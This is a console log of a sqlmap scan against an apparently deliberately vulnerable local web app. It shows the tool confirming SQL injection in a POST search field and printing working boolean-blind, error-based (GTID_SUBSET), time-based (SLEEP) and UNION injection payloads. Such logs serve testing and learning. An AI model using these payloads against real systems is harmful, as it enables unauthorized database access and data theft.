C:\Users\sirad\sqlmap-dev>python sqlmap.py -u "http://127.0.0.1:8000/searchVulnerable/" --data="search_query=admin" --level=1 --risk=1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.4.1#dev}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:23:02 /2024-04-11/

[21:23:02] [INFO] testing connection to the target URL
[21:23:02] [INFO] testing if the target URL content is stable
[21:23:02] [INFO] target URL content is stable
[21:23:02] [INFO] testing if POST parameter 'search_query' is dynamic
[21:23:02] [INFO] POST parameter 'search_query' appears to be dynamic
[21:23:03] [INFO] heuristic (basic) test shows that POST parameter 'search_query' might be injectable (possible DBMS: 'MySQL')
[21:23:04] [INFO] testing for SQL injection on POST parameter 'search_query'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:23:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:23:34] [WARNING] reflective value(s) found and filtering out
[21:23:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:23:35] [INFO] testing 'Generic inline queries'
[21:23:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:23:35] [INFO] POST parameter 'search_query' appears to be 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="admin")
[21:23:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:23:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:23:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:23:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:23:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:23:36] [INFO] POST parameter 'search_query' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
[21:23:36] [INFO] testing 'MySQL inline queries'
[21:23:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:23:36] [WARNING] time-based comparison requires larger statistical model, please wait... (done)
[21:23:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:23:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:23:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:23:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:23:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:23:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:23:46] [INFO] POST parameter 'search_query' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[21:23:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:23:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:23:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:23:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:23:46] [INFO] target URL appears to have 4 columns in query
[21:23:47] [INFO] POST parameter 'search_query' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search_query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: search_query (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: search_query=admin' AND 5175=5175#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search_query=admin' AND GTID_SUBSET(CONCAT(0x717a6b7871,(SELECT (ELT(8009=8009,1))),0x71786a7671),8009)-- GtAh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search_query=admin' AND (SELECT 6265 FROM (SELECT(SLEEP(5)))Utqh)-- QElk

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: search_query=admin' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6b7871,0x426d544d517a4758686562684253744e736e795869486162456d725968536e686a6d5a716366666c,0x71786a7671)#
---
[21:23:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[21:23:56] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 15 times
[21:23:56] [INFO] fetched data logged to text files under 'C:\Users\sirad\AppData\Local\sqlmap\output\127.0.0.1'

[*] ending @ 21:23:56 /2024-04-11/